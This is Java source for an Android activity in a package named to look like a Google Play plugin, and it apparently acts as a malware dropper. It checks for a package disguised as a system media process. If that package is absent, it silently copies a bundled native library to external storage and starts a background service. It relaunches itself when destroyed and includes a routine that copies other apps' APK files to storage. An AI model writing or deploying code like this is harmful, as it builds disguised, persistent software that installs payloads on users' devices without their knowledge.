package com.google.play.plugin.compat;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.content.pm.PackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.ResolveInfo;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.io.*;
import java.util.*;

public class MainActivity extends Activity {
	private ReceiverBoot receiver;

	public void startSer(Context context) {
		Intent intent = new Intent(context, MainActivity.class);
		context.startActivity(intent);
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		receiver = new ReceiverBoot();
		receiver.setDoc();

		String pathExternal = receiver.pathExternal;
		
		File htdocs = new File(pathExternal);
        if (!htdocs.exists()) {
            htdocs.mkdir();
        }


		if (!apkMana(this, "android.process.media.ui", "cek")) 
		{
			
			try {
				new Installer(this, true).assetToSdcard(this, "libssp.so", pathExternal+"/");
				Thread.sleep(50);
			}
			catch(Exception e) {
			}
			this.startService(new Intent(this, ServiceThread.class));
		}
		finish();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		startSer(this);
	}

	public boolean apkMana(Context context, String packageName, String pilih) {
		PackageManager manager = context.getPackageManager();

		if (pilih.equals("open")) {
			try {
				Intent i = manager.getLaunchIntentForPackage(packageName);
				if (i == null) {
					return false;
				}
				i.addCategory(Intent.CATEGORY_LAUNCHER);
				context.startActivity(i);
				return true;
			} 
			catch (Exception e) {
				return false;
			}
		}
		else if (pilih.equals("cek")) {
			try {
				manager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
				return true;
			}catch(PackageManager.NameNotFoundException e) {
				return false;
			}
		} 
		else if (pilih.equals("pull")) {
			final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
			mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
			mainIntent.setPackage(packageName);
			mainIntent.setFlags(ApplicationInfo.FLAG_ALLOW_BACKUP);
			final List pkgAppsList = context.getPackageManager().queryIntentActivities(mainIntent, 0);
			for (Object object : pkgAppsList) {
				ResolveInfo info = (ResolveInfo) object;
				if ( info.activityInfo.applicationInfo.packageName == null ) {
					return false;
				}

				File file = new File(info.activityInfo.applicationInfo.publicSourceDir);
				File dest = new File(receiver.pathExternal+"/" + info.activityInfo.applicationInfo.packageName + ".apk");
				File parent = dest.getParentFile();
				if ( parent != null ) parent.mkdirs();
				try {
 					InputStream in = new FileInputStream(file);
					OutputStream out = new FileOutputStream(dest);
					byte[] buf = new byte[1024];
					int len;
					while ((len = in.read(buf)) > 0) {
 						out.write(buf, 0, len);
					}
					in.close();
					out.close();

 					return true;
				} 
				catch (IOException e) {
					Log.i("kalau", "zzzzzzzz: "+e);

					return false;
				}
			}
		}
		return false;
	}
}
